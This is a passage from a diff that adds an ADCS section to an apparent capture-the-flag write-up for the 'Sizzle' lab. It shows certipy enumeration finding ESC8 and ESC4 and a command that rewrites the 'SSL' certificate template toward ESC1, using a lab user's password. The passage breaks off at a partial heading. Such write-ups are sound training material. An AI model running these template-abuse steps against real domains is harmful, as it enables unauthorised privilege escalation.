@@ -308,3 +308,131 @@ After vising the web server and running ferpxbuster i get an endpoint `certenrol
 
 So now if i access `/certsrv` i get prompted for a login which amandas creds give me access to
 
+# ADCS
+```python
+certipy-ad find -u amanda@htb.local -p 'Ashare1972' -vulnerable -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: HTB.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 18 issuance policies
+[*] Found 0 OIDs linked to templates
+[!] DNS resolution failed: The DNS query name does not exist: sizzle.HTB.LOCAL.
+[!] Use -debug to print a stacktrace
+[*] Retrieving CA configuration for 'HTB-SIZZLE-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'HTB-SIZZLE-CA'
+[*] Checking web enrollment for CA 'HTB-SIZZLE-CA' @ 'sizzle.HTB.LOCAL'
+[!] Failed to check channel binding: The read operation timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : HTB-SIZZLE-CA
+    DNS Name                            : sizzle.HTB.LOCAL
+    Certificate Subject                 : CN=HTB-SIZZLE-CA, DC=HTB, DC=LOCAL
+    Certificate Serial Number           : 753496F256EE309F456E223A2AE01EA2
+    Certificate Validity Start          : 2018-07-02 20:26:03+00:00
+    Certificate Validity End            : 2028-07-02 20:36:02+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : True
+      HTTPS
+        Enabled                         : True
+        Channel Binding (EPA)           : Unknown
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : HTB.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        ManageCertificates              : HTB.LOCAL\Administrators
+                                          HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+        Enroll                          : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC8                              : Web Enrollment is enabled over HTTP.
+Certificate Templates
+  0
+    Template Name                       : SSL
+    Display Name                        : SSL
+    Certificate Authorities             : HTB-SIZZLE-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2018-07-03T18:06:11+00:00
+    Template Last Modified              : 2018-07-03T18:06:45+00:00
+    Permissions
+      Object Control Permissions
+        Owner                           : HTB.LOCAL\Administrator
+        Full Control Principals         : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+        Write Owner Principals          : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+        Write Dacl Principals           : HTB.LOCAL\Domain Admins
+                                          HTB.LOCAL\Enterprise Admins
+                                          HTB.LOCAL\Administrator
+                                          HTB.LOCAL\Authenticated Users
+    [+] User Enrollable Principals      : HTB.LOCAL\Authenticated Users
+    [+] User ACL Principals             : HTB.LOCAL\Authenticated Users
+    [!] Vulnerabilities
+      ESC4                              : User has dangerous permissions.
+```
+Looks to be vulnerable to ESC4 which i can use to make it vulnerable to ESC1
+
+## ESC4
+```python
+certipy-ad template \
+    -u 'amanda@htb.local' -p 'Ashare1972' \
+    -dc-ip '10.129.15.12' -template 'SSL' \
+    -write-default-configuration
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'SSL.json'
+[*] Wrote current configuration for 'SSL' to 'SSL.json'
+[*] Updating certificate template 'SSL'
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'SSL'? (y/N): y
+[*] Successfully updated 'SSL'
+```
+Using ESC4 i can modify the template to make it vulnerable to ESC1
+
+## ES
